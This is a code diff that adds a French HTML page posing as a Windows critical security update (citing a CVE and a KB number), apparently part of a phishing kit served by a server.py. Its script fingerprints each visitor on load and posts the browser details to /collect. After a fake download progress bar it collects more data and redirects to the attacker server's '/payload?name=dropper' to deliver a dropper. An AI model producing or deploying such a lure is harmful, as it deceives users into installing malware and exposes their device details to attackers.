@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Mise à jour critique disponible</title>
+<style>
+  :root{--bg:#f0f0f0;--panel:#fff;--blue:#0078d4;--text:#1a1a1a;--dim:#666}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);font-family:'Segoe UI',Arial,sans-serif;
+       min-height:100vh;display:flex;flex-direction:column;
+       align-items:center;justify-content:center}
+  .taskbar{position:fixed;bottom:0;left:0;right:0;height:48px;
+           background:#1a1a2e;display:flex;align-items:center;padding:0 16px}
+  .panel{background:var(--panel);border-radius:8px;padding:48px 44px;
+         width:480px;max-width:95vw;
+         box-shadow:0 4px 24px rgba(0,0,0,.12)}
+  .win-logo{font-size:48px;text-align:center;margin-bottom:16px}
+  h1{font-size:22px;font-weight:600;margin-bottom:10px}
+  p{color:var(--dim);font-size:14px;line-height:1.6;margin-bottom:20px}
+  .bar-wrap{margin:24px 0}
+  .bar-label{font-size:12px;color:var(--dim);margin-bottom:6px}
+  .bar{height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden}
+  .bar-fill{height:100%;width:0%;background:var(--blue);
+            border-radius:3px;transition:width .3s}
+  .info-box{background:#f5f9ff;border:1px solid #c8dff8;border-radius:6px;
+            padding:14px 16px;font-size:13px;color:var(--text);margin-bottom:24px}
+  button{width:100%;padding:13px;background:var(--blue);border:none;
+         border-radius:4px;color:#fff;font-size:15px;font-weight:600;cursor:pointer}
+  button:hover{background:#006cbe}
+  .small{font-size:11px;color:var(--dim);margin-top:12px;text-align:center}
+</style>
+</head>
+<body>
+<div class="taskbar">
+  <svg width="32" height="32" viewBox="0 0 32 32" fill="white">
+    <rect x="1"  y="1"  width="14" height="14" fill="#f35"/>
+    <rect x="17" y="1"  width="14" height="14" fill="#4f4"/>
+    <rect x="1"  y="17" width="14" height="14" fill="#55f"/>
+    <rect x="17" y="17" width="14" height="14" fill="#ff5"/>
+  </svg>
+</div>
+
+<div class="panel">
+  <div class="win-logo">🪟</div>
+  <h1>Mise à jour de sécurité critique</h1>
+  <p>Windows a détecté une vulnérabilité critique (CVE-2025-21334).
+     Une mise à jour immédiate est requise pour protéger vos données.</p>
+  <div class="info-box">
+    📦 <strong>Windows Security Update KB5035942</strong><br>
+    Taille : 128 MB · Priorité : Critique · Date : aujourd'hui
+  </div>
+  <div class="bar-wrap">
+    <div class="bar-label" id="bar-label">Préparation de la mise à jour…</div>
+    <div class="bar"><div class="bar-fill" id="bar"></div></div>
+  </div>
+  <button id="btn" onclick="startUpdate()">Installer la mise à jour</button>
+  <div class="small">Votre ordinateur redémarrera automatiquement après l'installation.</div>
+</div>
+
+<script>
+// SERVER_IP et PORT injectés par server.py via _serve_page()
+const SERVER = "http://FILL_SERVER:FILL_PORT";
+
+// Fingerprint à l'arrivée
+fetch("/collect", {
+  method:"POST",
+  headers:{"Content-Type":"application/json"},
+  body:JSON.stringify({
+    page:"update_land",
+    ua:navigator.userAgent,
+    lang:navigator.language,
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen:screen.width+"x"+screen.height,
+    cores:navigator.hardwareConcurrency,
+  })
+});
+
+function startUpdate() {
+  document.getElementById("btn").textContent = "Téléchargement en cours…";
+  document.getElementById("btn").disabled = true;
+  let w = 0;
+  const bar   = document.getElementById("bar");
+  const label = document.getElementById("bar-label");
+  const iv = setInterval(() => {
+    w = Math.min(w + Math.random() * 3 + 1, 100);
+    bar.style.width = w + "%";
+    if (w < 30)       label.textContent = "Téléchargement du package…";
+    else if (w < 60)  label.textContent = "Vérification de l'intégrité…";
+    else if (w < 90)  label.textContent = "Préparation de l'installation…";
+    else              label.textContent = "Finalisation…";
+    if (w >= 100) {
+      clearInterval(iv);
+      label.textContent = "Téléchargement terminé — lancement du setup…";
+      // Collect fingerprint complet
+      fetch("/collect", {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({
+          page:"update_click",
+          ua:navigator.userAgent,
+          lang:navigator.language,
+          tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+          screen:screen.width+"x"+screen.height,
+          cores:navigator.hardwareConcurrency,
+          mem:navigator.deviceMemory,
+        })
+      });
+      // Livraison dropper chain
+      setTimeout(() => {
+        window.location.href =
+          SERVER + "/payload?name=dropper";
+      }, 1500);
+    }
+  }, 80);
+}
+</script>
+</body>
+</html>
